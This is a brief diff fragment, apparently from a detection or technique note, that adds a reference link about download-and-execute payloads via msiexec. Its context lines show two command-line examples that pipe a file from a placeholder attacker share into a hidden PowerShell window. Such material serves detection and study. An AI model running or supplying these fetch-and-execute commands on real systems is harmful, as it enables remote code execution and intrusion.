@@ -12,3 +12,7 @@
 	
 	Command-Line: type \\<attacker-ip>\<payload-name>.txt | powershell -w h
 	Command-Line: more \\<attacker-ip>\<payload-name>.txt | powershell -w h
+
+
+Refer:
+https://iamroot.blog/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec/
